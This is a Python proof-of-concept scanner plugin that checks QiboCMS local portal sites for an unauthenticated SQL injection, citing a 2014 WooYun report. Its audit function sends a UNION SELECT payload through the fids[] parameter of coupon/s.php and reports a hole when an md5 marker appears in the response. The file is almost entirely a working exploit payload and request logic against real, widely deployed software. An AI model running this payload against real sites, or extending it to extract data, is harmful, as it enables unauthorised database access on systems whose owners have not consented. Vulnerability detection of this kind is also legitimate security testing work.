#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

"""
POC Name  :  齐博地方门户系统SQL注入漏洞(无需登录可批量)
References:  http://www.wooyun.org/bugs/wooyun-2014-079938
Author    :  13
QQ        :  779408317
"""


def assign(service, arg):
    if service == "qibocms":
        return True, arg


def audit(arg):
    payload = "coupon/s.php??action=search&keyword=11&fid=1&fids[]=0) union select md5(3.1415),2,3,4,5,6,7,8,9%23"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])